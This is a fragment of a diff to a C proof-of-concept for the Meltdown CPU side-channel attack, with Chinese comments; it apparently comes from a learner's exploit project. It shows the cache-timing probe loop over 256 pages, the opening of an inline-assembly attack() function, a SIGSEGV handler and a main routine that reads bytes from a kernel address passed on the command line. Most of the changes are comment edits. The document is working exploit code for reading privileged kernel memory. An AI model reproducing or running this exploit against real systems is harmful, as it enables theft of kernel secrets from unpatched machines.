@@ -28,18 +28,17 @@ int gettime(volatile char *addr){ //读取一个地址内的字节读出来的�
 int loadpage(){  //检查test数组里每个位置读取的时间，寻找最小的那个，即可判断攻击地址的值
     unsigned int volatile pagenum,ans,min=0xffffffff,time;
     for (int i=0;i<256;i++){
-        pagenum=((i * 167) + 13) & 255;
+        pagenum=((i * 167) + 13) %256;
 		//一个数字游戏，取值结果为 0 - 255 随机数且不重复，执行顺序轻微混淆可以防止stride prediction（某种分支预测方法）
         time=gettime(test+pagesize*pagenum);
         if (min>time){
             min=time;
             ans=pagenum;
-        }
+        }//记录最少的时间
     }
     return ans;   
 }
-int attack(char* addr)
-{	
+int attack(char* addr){	
 	//核心代码，是一段内联汇编
 	try{
 	asm volatile (//volatile让编译器不会优化这段代码
@@ -84,10 +83,10 @@ int main(int argc, const char* * argv){
     char* addr;
     char content[100];
     int tmp,len,max1,max2;
-    int fd = open("/proc/version", O_RDONLY);//打开一个文件，暂时不知道有什么作用，参考的是proc里的代码。如果没有会失败。猜测和数组存入cache有关
+    int fd = open("/proc/version", O_RDONLY);//打开一个文件，暂时不知道有什么作用，参考了网上代码，但删除会导致攻击失败
 	signal(SIGSEGV,SegErrCatch);//注册SIGSEGV信号的处理函数   
-	sscanf(argv[1],"%lx",&addr);//melt.sh传来了linux_proc_banner的地址
-    sscanf(argv[2],"%d",&len);//读取指定数量的字节
+	sscanf(argv[1],"%lx",&addr);//攻击地址
+    sscanf(argv[2],"%d",&len);//读取字节数
     printf("读取该地址%lx后%d字节的内容：\n",addr,len);
     for (int j=0;j<len;j++){
         memset(p,0,sizeof(p));
